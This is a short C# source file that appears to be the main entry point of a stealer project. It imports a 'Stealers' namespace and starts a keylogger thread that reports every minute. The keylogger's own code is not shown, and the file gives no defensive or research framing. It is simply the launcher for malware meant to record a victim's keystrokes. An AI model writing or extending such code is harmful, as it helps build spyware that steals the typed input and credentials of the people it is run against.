using sub.Stealers;

namespace sub
{
    class Program
    {
        static void Main()
        {
            StealerThread logger = new StealerThread(new Keylogger());    
            logger.Start(1); //Starts a Keylogger that returns every 1 minute
        }
    }
}
